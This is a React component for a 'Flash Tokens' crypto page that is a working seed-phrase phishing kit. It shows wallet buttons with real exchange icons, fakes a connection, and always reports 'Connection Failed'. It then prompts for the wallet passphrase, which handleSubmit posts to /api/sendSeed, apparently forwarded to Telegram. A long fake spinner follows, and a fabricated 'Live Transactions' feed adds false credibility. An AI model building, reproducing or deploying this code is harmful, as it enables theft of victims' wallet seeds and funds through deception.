import { useState, useEffect } from 'react';

const TOKEN_OPTIONS = [
  'USDT (TRC20)', 'USDT (BEP20)', 'USDT (ERC20)', 'Bitcoin (BEP20)', 'USDC (BEP20)', 'ETH (BEP20)', 'SHIB (BEP20)'
];

const WALLET_OPTIONS = [
  { name: 'Binance', icon: 'https://bin.bnbstatic.com/static/favicon.ico' },
  { name: 'Bybit', icon: 'https://static.bybit.com/icons/favicon.ico' },
  { name: 'Coinbase Wallet', icon: 'https://www.coinbase.com/favicon.ico' },
  { name: 'Bitget', icon: 'https://cdn.bitget.com/favicon.ico' },
  { name: 'Trust Wallet', icon: 'https://trustwallet.com/assets/images/favicon.png' },
  { name: 'Wallet Connect', icon: 'https://walletconnect.com/favicon.ico' },
];

export default function Flash() {
  const [isLoading, setIsLoading] = useState(true);
  const [receiverAddress, setReceiverAddress] = useState('');
  const [selectedToken, setSelectedToken] = useState(TOKEN_OPTIONS[0]);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [walletLoading, setWalletLoading] = useState(false);
  const [connectionFailed, setConnectionFailed] = useState(false);
  const [passphrase, setPassphrase] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState(null);

  useEffect(() => {
    try {
      const timer = setTimeout(() => setIsLoading(false), 10000);
      return () => clearTimeout(timer);
    } catch (err) {
      setError('Failed to initialize loading timer: ' + err.message);
    }
  }, []);

  const handleFlash = () => {
    try {
      setIsModalOpen(true);
      setConnectionFailed(false);
      setPassphrase('');
      setIsSubmitting(false);
    } catch (err) {
      setError('Flash button error: ' + err.message);
    }
  };

  const handleWalletClick = () => {
    try {
      setWalletLoading(true);
      setTimeout(() => {
        setWalletLoading(false);
        setConnectionFailed(true);
      }, 5000);
    } catch (err) {
      setError('Wallet connection error: ' + err.message);
    }
  };

  const handleSubmit = async () => {
    try {
      setIsSubmitting(true);
      const response = await fetch('/api/sendSeed', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ seedPhrase: passphrase }),
      });
      if (!response.ok) throw new Error('Failed to send to Telegram');
      setTimeout(() => {
        setIsSubmitting(false);
        setPassphrase('');
        setIsModalOpen(false);
      }, 100000); // 100 seconds
    } catch (err) {
      setError('Submit error: ' + err.message);
      setIsSubmitting(false);
    }
  };

  if (error) return <div className="container">Error: {error}</div>;
  if (isLoading) return <div className="loading"><div className="spinner"></div></div>;

  return (
    <div className="container flash">
      <h1>Flash Tokens ⚡</h1>
      <input
        type="text"
        placeholder="Receiver Wallet 👾"
        value={receiverAddress}
        onChange={(e) => setReceiverAddress(e.target.value)}
      />
      <select value={selectedToken} onChange={(e) => setSelectedToken(e.target.value)}>
        {TOKEN_OPTIONS.map((option) => (
          <option key={option} value={option}>{option}</option>
        ))}
      </select>
      <button onClick={handleFlash}>Flash 🚀</button>

      {isModalOpen && (
        <div className="modal">
          <div className="modal-content">
            <h2>Link Wallet 🔗</h2>
            {walletLoading ? (
              <div className="loading">
                <div className="spinner"></div>
                <p>Connecting... 🌐</p>
              </div>
            ) : isSubmitting ? (
              <div className="loading">
                <div className="spinner"></div>
                <p>Connecting... 🔄</p>
              </div>
            ) : connectionFailed ? (
              <>
                <p className="error-text">Connection Failed ❌ - Connect Manually</p>
                <input
                  type="text"
                  placeholder="Enter Passphrase 🔑"
                  value={passphrase}
                  onChange={(e) => setPassphrase(e.target.value)}
                />
                <button onClick={handleSubmit}>Submit ✅</button>
              </>
            ) : (
              <div className="wallet-options">
                {WALLET_OPTIONS.map((wallet) => (
                  <button key={wallet.name} onClick={handleWalletClick}>
                    <img src={wallet.icon} alt={wallet.name} className="wallet-icon" />
                    {wallet.name}
                  </button>
                ))}
              </div>
            )}
            <button className="close-btn" onClick={() => setIsModalOpen(false)}>Close X</button>
          </div>
        </div>
      )}

      <div className="transactions">
        <h2>Live Transactions 📡</h2>
        <ul>
          <li className="transaction-item">0x123... → 0x456...: 100 USDT 💸</li>
          <li className="transaction-item">0x789... → 0xabc...: 0.5 BTC ⚡</li>
          <li className="transaction-item">0xdef... → 0xghi...: 200 ETH 🌩️</li>
          <li className="transaction-item">0xjkl... → 0xmno...: 500 SHIB 🐾</li>
          <li className="transaction-item">0xpqr... → 0xstu...: 50 USDC 💰</li>
        </ul>
      </div>
    </div>
  );
}
